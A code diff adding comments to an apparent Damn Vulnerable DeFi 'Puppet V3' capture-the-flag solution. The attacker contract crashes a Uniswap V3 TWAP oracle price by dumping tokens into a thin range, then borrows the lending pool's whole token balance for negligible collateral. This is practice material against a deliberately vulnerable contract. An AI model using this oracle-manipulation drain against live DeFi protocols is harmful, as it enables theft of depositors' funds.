@@ -42,7 +42,8 @@ contract Attacker {
     receive() external payable {}
 
     function CrashDVTprice() external {
-        // Swap DVT to WETH to decrease the DVT/WETH oracle price.
+        // Dump all our DVT into the tight Uniswap V3 range.
+        // This pulls out almost all available WETH and leaves DVT looking cheap.
         uint256 amountIn = token.balanceOf(address(this));
         token.approve(address(SWAP_ROUTER), amountIn);
 
@@ -61,10 +62,12 @@ contract Attacker {
     }
 
     function Drainborrowing() external {
+        // Keep the ETH from the challenge usable as collateral too.
         if (address(this).balance > 0) {
             weth.deposit{value: address(this).balance}();
         }
 
+        // After the TWAP has absorbed the bad price, the required WETH is tiny.
         uint256 borrowAmount = token.balanceOf(address(pool));
         uint256 wethRequired = pool.calculateDepositOfWETHRequired(
             borrowAmount
@@ -216,6 +219,8 @@ contract PuppetV3Challenge is Test {
         require(success, "ETH transfer failed");
 
         StatesLog("after funding attacker", address(attacker));
+        // First move the price. The pool uses a 10 minute TWAP, not spot price,
+        // so we wait just under the challenge time limit before borrowing.
         attacker.CrashDVTprice();
         skip(114);
         attacker.Drainborrowing();
